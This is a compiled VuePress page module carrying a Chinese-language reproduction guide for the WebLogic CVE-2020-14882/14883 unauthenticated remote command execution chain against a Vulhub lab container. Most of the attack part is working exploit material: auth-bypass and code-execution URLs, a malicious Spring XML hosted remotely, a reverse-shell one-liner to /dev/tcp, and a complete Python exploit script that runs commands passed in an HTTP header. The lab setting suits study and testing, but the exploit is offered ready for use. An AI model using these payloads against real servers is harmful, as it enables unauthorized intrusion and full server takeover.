import{_ as t}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as i,c as l,a as n,b as s,d as e,e as p}from"./app-58e4a7d6.js";const c={},r=n("h2",{id:"漏洞描述",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),s(" 漏洞描述")],-1),u=n("p",null,"Weblogic是Oracle公司推出的J2EE应用服务器。在2020年10月的更新中，Oracle官方修复了两个长亭科技安全研究员@voidfyoo 提交的安全漏洞，分别是CVE-2020-14882和CVE-2020-14883。",-1),d=n("p",null,"CVE-2020-14882允许未授权的用户绕过管理控制台的权限验证访问后台，CVE-2020-14883允许后台任意用户通过HTTP协议执行任意命令。使用这两个漏洞组成的利用链，可通过一个GET请求在远程Weblogic服务器上以未授权的任意用户身份执行命令。",-1),m=n("p",null,"参考链接：",-1),v={href:"https://www.oracle.com/security-alerts/cpuoct2020traditional.html",target:"_blank",rel:"noopener noreferrer"},g={href:"https://testbnull.medium.com/weblogic-rce-by-only-one-get-request-cve-2020-14882-analysis-6e4b09981dbf",target:"_blank",rel:"noopener noreferrer"},k=p(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub执行如下命令启动一个Weblogic 12.2.1.3版本的服务器：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>启动完成后，访问<code>http://your-ip:7001/console</code>即可查看到后台登录页面。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203022043612.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="xray" tabindex="-1"><a class="header-anchor" href="#xray" aria-hidden="true">#</a> Xray</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>VulnType         &quot;poc-yaml-weblogic-cve-2020-14750/default&quot;
links            [&quot;https://www.oracle.com/security-alerts/alert-cve-2020-14750.html&quot;]
weblogic_version &quot;10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>首先测试权限绕过漏洞（CVE-2020-14882），访问以下URL，即可未授权访问到管理后台页面：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>http://your-ip:7001/console/css/%252e%252e%252fconsole.portal
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203022044479.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>访问后台后，可以发现我们现在是低权限的用户，无法安装应用，所以也无法直接执行任意代码。</p><p>此时需要利用到第二个漏洞CVE-2020-14883。这个漏洞的利用方式有两种，一是通过<code>com.tangosol.coherence.mvel2.sh.ShellSession</code>，二是通过<code>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</code>。</p><p>直接访问如下URL，即可利用<code>com.tangosol.coherence.mvel2.sh.ShellSession</code>执行命令：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>http://your-ip:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(&quot;java.lang.Runtime.getRuntime().exec(&#39;touch%20/tmp/awesome_poc&#39;);&quot;)
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>进入容器，可以发现<code>touch /tmp/awesome_poc</code>已成功执行：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203022050933.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>这个利用方法只能在Weblogic 12.2.1以上版本利用，因为10.3.6并不存在<code>com.tangosol.coherence.mvel2.sh.ShellSession</code>类。</p><p><code>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</code>是一种更为通杀的方法，最早在CVE-2019-2725被提出，对于所有Weblogic版本均有效。</p><p>首先，我们需要构造一个XML文件，并将其保存在Weblogic可以访问到的服务器上，如<code>http://example.com/rce.xml</code>：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;
&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;
   xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
   xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;
    &lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot; init-method=&quot;start&quot;&gt;
        &lt;constructor-arg&gt;
          &lt;list&gt;
            &lt;value&gt;bash&lt;/value&gt;
            &lt;value&gt;-c&lt;/value&gt;
            &lt;value&gt;&lt;![CDATA[touch awesome_poc_xml]]&gt;&lt;/value&gt;
          &lt;/list&gt;
        &lt;/constructor-arg&gt;
    &lt;/bean&gt;
&lt;/beans&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>然后通过如下URL，即可让Weblogic加载这个XML，并执行其中的命令：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>http://your-ip:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(&quot;http://example.com/rce.xml&quot;)
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>进入容器，可以发现<code>touch /tmp/awesome_poc_xml</code>已成功执行：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203022054641.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>这个利用方法也有自己的缺点，就是需要Weblogic的服务器能够访问到恶意XML。</p><h3 id="反弹shell" tabindex="-1"><a class="header-anchor" href="#反弹shell" aria-hidden="true">#</a> 反弹shell</h3><p>通过漏洞poc反弹shell：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>python CVE-2020-14882.py -u http://192.168.174.128:7001 -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.174.128/9999 0&gt;&amp;1&quot; 
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>监听9999端口，成功接收反弹shell：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203022102393.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞poc" tabindex="-1"><a class="header-anchor" href="#漏洞poc" aria-hidden="true">#</a> 漏洞POC</h2><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment">#!/usr/bin/env python3</span>
<span class="token comment"># -*- coding: utf-8 -*-</span>
<span class="token comment"># author: zhzyker</span>
<span class="token comment"># from: https://github.com/zhzyker/vulmap</span>
<span class="token comment"># from: https://github.com/zhzyker/exphub</span>
<span class="token keyword">import</span> http<span class="token punctuation">.</span>client
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> argparse
http<span class="token punctuation">.</span>client<span class="token punctuation">.</span>HTTPConnection<span class="token punctuation">.</span>_http_vsn_str <span class="token operator">=</span> <span class="token string">&#39;HTTP/1.0&#39;</span>

payload_cve_2020_14882_v12 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">&#39;_nfpb=true&amp;_pageLabel=&amp;handle=&#39;</span>
            <span class="token string">&#39;com.tangosol.coherence.mvel2.sh.ShellSession(&quot;weblogic.work.ExecuteThread executeThread = &#39;</span>
            <span class="token string">&#39;(weblogic.work.ExecuteThread) Thread.currentThread(); weblogic.work.WorkAdapter adapter = &#39;</span>
            <span class="token string">&#39;executeThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField&#39;</span>
            <span class="token string">&#39;(&quot;connectionHandler&quot;); field.setAccessible(true); Object obj = field.get(adapter); weblogic.servlet&#39;</span>
            <span class="token string">&#39;.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl) &#39;</span>
            <span class="token string">&#39;obj.getClass().getMethod(&quot;getServletRequest&quot;).invoke(obj); String cmd = req.getHeader(&quot;cmd&quot;); &#39;</span>
            <span class="token string">&#39;String[] cmds = System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;window&quot;) ? new String[]&#39;</span>
            <span class="token string">&#39;{&quot;cmd.exe&quot;, &quot;/c&quot;, cmd} : new String[]{&quot;/bin/sh&quot;, &quot;-c&quot;, cmd}; if (cmd != null) { String result &#39;</span>
            <span class="token string">&#39;= new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter&#39;</span>
            <span class="token string">&#39;(&quot;\\\\\\\\A&quot;).next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.&#39;</span>
            <span class="token string">&#39;ServletResponseImpl) req.getClass().getMethod(&quot;getResponse&quot;).invoke(req);&#39;</span>
            <span class="token string">&#39;res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));&#39;</span>
            <span class="token string">&#39;res.getServletOutputStream().flush(); res.getWriter().write(&quot;&quot;); }executeThread.interrupt(); &quot;);&#39;</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">cve_2020_14882</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span><span class="token punctuation">:</span>
    payload <span class="token operator">=</span> payload_cve_2020_14882_v12
    path <span class="token operator">=</span> <span class="token string">&quot;/console/css/%252e%252e%252fconsole.portal&quot;</span>
    headers <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">&#39;User-Agent&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;Accept&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,&#39;</span>
                  <span class="token string">&#39;application/signed-exchange;v=b3;q=0.9&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;Accept-Encoding&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;gzip, deflate&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;Accept-Language&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;zh-CN,zh;q=0.9&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;Connection&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;close&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;Content-Type&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;application/x-www-form-urlencoded&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;cmd&#39;</span><span class="token punctuation">:</span> cmd
    <span class="token punctuation">}</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        request <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token operator">+</span> path<span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> error<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[-] Vuln Check Failed... ...&quot;</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[-] More Weblogic vulnerabilities in https://github.com/zhzyker/vulmap&quot;</span><span class="token punctuation">)</span>




<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&#39;__main__&#39;</span><span class="token punctuation">:</span>
    parser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span>description<span class="token operator">=</span><span class="token string">&#39;Weblogic cve-2020-14882&#39;</span><span class="token punctuation">,</span>
                                     usage<span class="token operator">=</span><span class="token string">&#39;use &quot;python %(prog)s --help&quot; for more information&#39;</span><span class="token punctuation">,</span>
                                     formatter_class<span class="token operator">=</span>argparse<span class="token punctuation">.</span>RawTextHelpFormatter<span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&quot;-u&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;--url&quot;</span><span class="token punctuation">,</span>
                        dest<span class="token operator">=</span><span class="token string">&quot;url&quot;</span><span class="token punctuation">,</span>
                        <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&quot;target url (http://127.0.0.1:7001)&quot;</span>
                        <span class="token punctuation">)</span>

    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&quot;-c&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;--cmd&quot;</span><span class="token punctuation">,</span>
                        dest<span class="token operator">=</span><span class="token string">&quot;cmd&quot;</span><span class="token punctuation">,</span>
                        <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&quot;command&quot;</span>
                        <span class="token punctuation">)</span>
    args <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> args<span class="token punctuation">.</span>url <span class="token keyword">or</span> <span class="token keyword">not</span> args<span class="token punctuation">.</span>cmd<span class="token punctuation">:</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token string">&#39;[*] Please assign url and cmd! \\n[*] Examples python cve-2020-14882_rce.py -u http://127.0.0.1:7001 -c whoami&#39;</span><span class="token punctuation">)</span>
    cve_2020_14882<span class="token punctuation">(</span>args<span class="token punctuation">.</span>url<span class="token punctuation">,</span> args<span class="token punctuation">.</span>cmd<span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="开源poc" tabindex="-1"><a class="header-anchor" href="#开源poc" aria-hidden="true">#</a> 开源POC</h2>`,34),b={href:"https://github.com/0xn0ne/weblogicScanner",target:"_blank",rel:"noopener noreferrer"},h={href:"https://github.com/rabbitmask/WeblogicScan",target:"_blank",rel:"noopener noreferrer"},_={href:"https://github.com/dr0op/WeblogicScan",target:"_blank",rel:"noopener noreferrer"};function q(x,w){const a=o("ExternalLinkIcon");return i(),l("div",null,[r,u,d,m,n("ul",null,[n("li",null,[n("a",v,[s("https://www.oracle.com/security-alerts/cpuoct2020traditional.html"),e(a)])]),n("li",null,[n("a",g,[s("https://testbnull.medium.com/weblogic-rce-by-only-one-get-request-cve-2020-14882-analysis-6e4b09981dbf"),e(a)])])]),k,n("ul",null,[n("li",null,[n("a",b,[s("https://github.com/0xn0ne/weblogicScanner"),e(a)])]),n("li",null,[n("a",h,[s("https://github.com/rabbitmask/WeblogicScan"),e(a)])]),n("li",null,[n("a",_,[s("https://github.com/dr0op/WeblogicScan"),e(a)])])])])}const S=t(c,[["render",q],["__file","Weblogic 管理控制台未授权远程命令执行漏洞 CVE-2020-14882_CVE-2020-14883.html.vue"]]);export{S as default};
